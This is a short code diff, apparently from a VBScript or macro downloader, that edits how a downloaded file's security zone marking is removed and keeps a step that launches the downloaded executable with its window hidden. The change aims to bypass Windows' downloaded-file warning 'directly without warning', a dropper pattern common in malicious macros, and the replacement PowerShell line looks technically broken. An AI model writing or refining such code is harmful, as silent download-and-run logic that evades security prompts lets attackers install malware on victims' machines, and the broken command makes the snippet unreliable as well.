@@ -36,9 +36,9 @@
             objStream.Close
         End If
         
-        ' Unblock the downloaded file (PowerShell)
+        ' Unblock the file using PowerShell (directly without warning)
         Set WshShell = CreateObject("WScript.Shell")
-        WshShell.Run "powershell -command Unblock-File -Path '" & tempFilePath & "'", 0, True
+        WshShell.Run "powershell -command Set-ItemProperty -Path '" & tempFilePath & "' -Name 'Zone.Identifier' -Value '0'", 0, True
         
         ' Run the downloaded EXE file silently
         WshShell.Run Chr(34) & tempFilePath & Chr(34), 0, False ' 0 hides the window
